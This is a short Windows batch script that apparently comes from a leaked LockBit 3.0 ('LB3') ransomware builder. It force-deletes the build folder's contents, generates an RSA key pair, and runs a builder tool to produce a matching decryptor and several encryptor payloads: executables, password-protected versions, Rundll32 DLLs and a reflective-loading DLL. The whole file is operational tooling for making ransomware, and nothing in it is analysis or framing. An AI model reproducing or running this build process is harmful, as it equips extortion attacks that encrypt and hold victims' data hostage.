ERASE /F /Q "%cd%\Build\*.*"
keygen -path "%cd%\Build" -pubkey pub.key -privkey priv.key
builder -type dec -privkey "%cd%\Build\priv.key" -config config.json -ofile "%cd%\Build\LB3Decryptor.exe"
builder -type enc -exe -pubkey "%cd%\Build\pub.key" -config config.json -ofile "%cd%\Build\LB3.exe"
builder -type enc -exe -pass -pubkey "%cd%\Build\pub.key" -config config.json -ofile "%cd%\Build\LB3_pass.exe"
builder -type enc -dll -pubkey "%cd%\Build\pub.key" -config config.json -ofile "%cd%\Build\LB3_Rundll32.dll"
builder -type enc -dll -pass -pubkey "%cd%\Build\pub.key" -config config.json -ofile "%cd%\Build\LB3_Rundll32_pass.dll"
builder -type enc -ref -pubkey "%cd%\Build\pub.key" -config config.json -ofile "%cd%\Build\LB3_ReflectiveDll_DllMain.dll"
pause
exit